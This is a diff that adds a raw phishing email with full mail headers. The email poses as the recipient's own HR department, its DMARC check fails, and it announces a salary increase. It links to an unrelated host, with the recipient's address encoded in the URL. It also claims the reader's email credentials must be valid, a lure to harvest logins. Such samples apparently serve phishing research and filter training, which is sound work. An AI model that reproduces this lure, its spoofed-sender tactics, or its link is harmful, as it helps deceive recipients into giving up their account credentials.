@@ -1,0 +1,124 @@
+Return-Path: info@seahorseinc.cc
+Delivered-To: jose@monkey.org
+X-FDA: 83162280642.15.D8BC5FD
+Received: from seahorseinc.cc (herman.vertrayahu.com.se [198.23.221.28])
+	by imf27.b.hostedemail.com (Postfix) with ESMTP id 354811A0009
+	for <jose@monkey.org>; Wed, 26 Feb 2025 14:10:19 +0000 (UTC)
+Authentication-Results: imf27.b.hostedemail.com;
+	dkim=none ("invalid DKIM record") header.d=monkey.org header.s=re1
+ header.b=uBcH23uC;
+	spf=pass (imf27.b.hostedemail.com: domain of info@seahorseinc.cc designates
+ 198.23.221.28 as permitted sender) smtp.mailfrom=info@seahorseinc.cc;
+	dmarc=fail reason="SPF not aligned (relaxed)" header.from=monkey.org
+ (policy=none)
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1740579020;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=lxt57teDEj0U2rU2dtE8/KxXuey6zlvVKetTHeD/C1k=;
+	b=NKcIzV8Ntnp8U5xeBcl9VpOBcehmhPkd1yk3IYEk2DSQ8aE3r1pt+jXifTGkQVsHCQ5yUO
+	HEmOmE8EP+dxLw/6GkFStve7yADX+WoK2wFg94eEXt/u5Mh67mjFARYl3vIWJmmmQzUdQ7
+	PYFUCL4sJU0d0FgH769qVCnxV3yqezA=
+ARC-Authentication-Results: i=1;
+	imf27.b.hostedemail.com;
+	dkim=none ("invalid DKIM record") header.d=monkey.org header.s=re1
+ header.b=uBcH23uC;
+	spf=pass (imf27.b.hostedemail.com: domain of info@seahorseinc.cc designates
+ 198.23.221.28 as permitted sender) smtp.mailfrom=info@seahorseinc.cc;
+	dmarc=fail reason="SPF not aligned (relaxed)" header.from=monkey.org
+ (policy=none)
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1740579020; a=rsa-sha256;
+	cv=none;
+	b=auSX401Ve/jNqtH9gd5OMdV1YxH9yocyor8J7yDY4RURXnbk26nzj545Y+Qs2GXmXnI/HT
+	jG75KYr/B8zr5DeTi8zz6b6SzMH0MBXYM/0lDvTbCqzAtHtyHfjmS2CRy2FBOrCkFW6eF9
+	CMni1UYKv7HzAS0rk0DofDVhIZ1+iu8=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=re1; d=monkey.org;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=HR@monkey.org;
+ bh=lxt57teDEj0U2rU2dtE8/KxXuey6zlvVKetTHeD/C1k=;
+ b=uBcH23uCbZcet5RW+n3xR8FsH+SYGeEjHZOK5rtYHfQfqm3bSW+Mxy7IrWuvhq07ALtD7jXrWZQC
+   GDH4kvt47PAYe9gA7knCU1R1yY8noOKaqGkpo1HGTudi3dMC1NCmy87KHY0QPxImO6whvQvylPL5
+   m1u7MF0/pnAU4MIbHGNgEexrymFtDVTi1NNohiTSfiuw0zCeHClZ9JHTodcv3hH8i4RIUqCE8XzB
+   4vn1XaPENn28BNA8ch94Rk/scD6D8dAd4gTF+7Vhaa620b62v6O0qcDxInEyeUxEpmNxcs3e1ncJ
+   dIt7XuhyyCvEt6qE6Yz+vVXh7APHqMIam2herA==
+From: HR Department  <HR@monkey.org>
+To: jose@monkey.org
+Subject: SALARY UPGRADE
+Date: 26 Feb 2025 06:10:17 -0800
+Message-ID: <20250226061016.1B8A67515C7F1C19@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam07
+X-Rspamd-Queue-Id: 354811A0009
+X-Stat-Signature: dsbtofiy41g5n957zpuon64d47byfff7
+X-Spam-Status: No, score=2.45
+X-Rspam-User: 
+X-HE-Tag: 1740579019-545016
+X-HE-Meta: 
+ U2FsdGVkX1+L/6mNN2L0ob52SJBrfYYAweaJXyz6Y7eKmLFIiuZBvTXZ0EExRBCiRodU/RlPOpeGAxm0ZjKfAVe5EGVg3xos3YgzmWO2I+oe4L7YvBOD3YSeGCMAV+hUhclcK+HxPzqr6uPOkbDysgE989611a4eSQOqEeSSn8rfg1yRB79XBiJGVkxxdKtv2GKaQQn2vwkDAUthOhPm5DvdqOujEsCpBlpSpkr+yd49z8RIvSaYSTTOUTNrqliTNSI+U1qUJ5WNiL+nSWamaqDl+8ErDX2C+PdHwfnzEfoUkQm4FSn1BiTK1z/CvavXpOjSizHDzAlAhM9jl4psDP5N5ZBx0FdHZNX+QlmLbrXKk0tm/WU3XhF/xQIiAinRoL+WoI+qUpD8uMn3V8XnbytNDV3mfxcc3eEbs4TxGHW5gXHcAtly4jzgN6+RMvrocAeX7CrQ9AGHfNBbtNKC4e/nqIX9Ugpkkn/NxLmKlcZHvxSKWfX+N2tzAgPaXh4GxRi1Mt9nFCcpDdY6bqFipn9yZ1XAuqz/EOtGqSKAPOea/RHWxXR+c7e3JdI1D5if02EABUTH+diinPBl/AH76RDCVAJjxNGrTS5m4JEu9K35b8BgyCT/EYSGNW7MBdODo2NNEHA5eFgAjc8S4noYpBDSLkO2+U+S+XpDBAoW8rS0YNMCorCsM73MhYDaXOtoBhYxeg+09paen/ih6v73gC4YfkjbOSgCUo67+oYNSkTIHxB6CpGrmegyvJqQrP16u/dFlCP6lL44vC7uGEK7mV/9prEwVWc0DHVcis3G/n0UMQV6qIrcHCDgvG+okkU5F1gAC9yBq0Von7JlfcH/CVQQitJhEqP9eAIVRjwhQHgn1qYy0jRXQLg+GEyBEa2SH3+kFB2sXeRwAZNDQzRLaTlh0LvpBOmyGZpeBeRVpJoqal1GEG/sprwhX3+7EC4+bgVfY0QbMEeXE0qtlHj/KYisjk4
+ /QmkpPYFfv9lLSHUDWXi1imWWKA4jqqZzfAvE+aBX/2Z0HHJoMbULrTXHyAw1OPTTrXqLAXwMdE3wYck06xQ2md/DEkWQe5hmqdrRrnsi7kivM5chwAQdwB+YdZjzFZpLdNAmKXeOBjkkuB3A9GM30t0aVe15s4sCELMj3VzGKyJ9oi7r+QkZ9f2gZJs+ZX9OgCfp159tKTaOGobLEFwDgMAMbgPXj+yNkNM8Bm+sZw0yKVPXdcdBw96stnKOzF8tI5aLbITP9d9n8Nlui/3ZqniphHg4q9UxmZNkaXaY+ldioJKcekiR31uSm1tor9iwL6hAwgEUCNFMpkeDHgvD4dxo1vMTz/SvAvtEeHbCOh7qhc7XkZKHAJFVg873tPAb9ajvqSI3yZNJWA14eBo2N5Y97TIbntOusWTBMwFB2VIsA9ZGXvtG+zg7t80s/NJ2r8zp3Bl2mF5Uz7e9eYgU30smvXTeE2Dsn0CNemq37/4gaDvtfpKqBHirTgMchr3jCQ5FCbwVLBNyJFSnmqdD+B+Wkxr7SIcary0Mi4amcj2atWI=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 65
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<div id=3D"gmail-v1m_-4991187094186708082editbody1_mr_css_attr" style=3D"te=
+xt-align: justify; color: rgb(34, 34, 34); text-transform: none; text-inden=
+t: 0px; letter-spacing: normal; font-family: arial, helvetica, sans-serif; =
+font-size: 15px; font-style: normal; font-weight: 400; word-spacing: 0px; w=
+hite-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, =
+255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px; text-decoration-style: initial; text-decoration-color=
+: initial; text-decoration-thickness: initial;"><font color=3D"#2c2d2e">Dea=
+r Colleagues,</font><br><br><font color=3D"#2c2d2e">As already announced, T=
+he salary upwards review and allowances will be effective from next month.<=
+/font><br><br><font color=3D"#2c2d2e">The H.R Dept has already completed th=
+e salary structure and it is to be disbursed , please check the below to se=
+e the details as soon as possible.</font><br><br>
+<span id=3D"gmail-v1m_-4991187094186708082gmail-OBJ_PREFIX_DWT174_com_zimbr=
+a_url_mr_css_attr" style=3D"color: rgb(44, 45, 46);">
+<a style=3D"color: rgb(17, 85, 204);" href=3D"http://zqupsddvl.fmpagri.com/=
+?userid=3Dam9zZUBtb25rZXkub3Jn" target=3D"_blank" rel=3D"noreferrer">Viewsa=
+lary-increase-sheet-YEAR-2024-And-Classified-Company-Engagements-Info/Doc.x=
+ls</a></span><br><br><br><font color=3D"#2c2d2e">You will be informed if th=
+ere are further details in advance by letter from the Human Resource depart=
+ment.</font><br><br><font color=3D"#2c2d2e">Regards</font><br><font color=
+=3D"#2c2d2e">Management.</font><br><br><font color=3D"#3d85c6">&nbsp;<span =
+id=3D"gmail-v1m_-4991187094186708082gmail-OBJ_PREFIX_DWT175_ZmEmailObjectHa=
+ndler_mr_css_attr"><span>&nbsp;</span>
+HR@monkey.org</span></font><br><br><br><strong style=3D"color: rgb(44, 45, =
+46);"><font color=3D"#df2d20" face=3D"Verdana" size=3D"2">Your Email Creden=
+tials Must be Valid to ensure you are the right Recipient of this Message.<=
+/font></strong></div>
+<div id=3D"gmail-v1m_-4991187094186708082editbody1_mr_css_attr" style=3D"te=
+xt-align: justify; color: rgb(44, 45, 46); text-transform: none; text-inden=
+t: 0px; letter-spacing: normal; font-family: arial, helvetica, sans-serif; =
+font-size: 15px; font-style: normal; font-weight: 400; word-spacing: 0px; w=
+hite-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, =
+255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px; text-decoration-style: initial; text-decoration-color=
+: initial; text-decoration-thickness: initial;"><div><font color=3D"#df2d20=
+" face=3D"Verdana"><b><br></b></font></div></div>
+<div id=3D"gmail-v1m_-4991187094186708082editbody1_mr_css_attr" style=3D"te=
+xt-align: justify; color: rgb(44, 45, 46); text-transform: none; text-inden=
+t: 0px; letter-spacing: normal; font-family: arial, helvetica, sans-serif; =
+font-size: 15px; font-style: normal; font-weight: 400; word-spacing: 0px; w=
+hite-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, =
+255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px; text-decoration-style: initial; text-decoration-color=
+: initial; text-decoration-thickness: initial;"><div><font color=3D"#df2d20=
+" face=3D"Verdana"><b><br></b></font></div></div>
+
+
+</body></html>
+
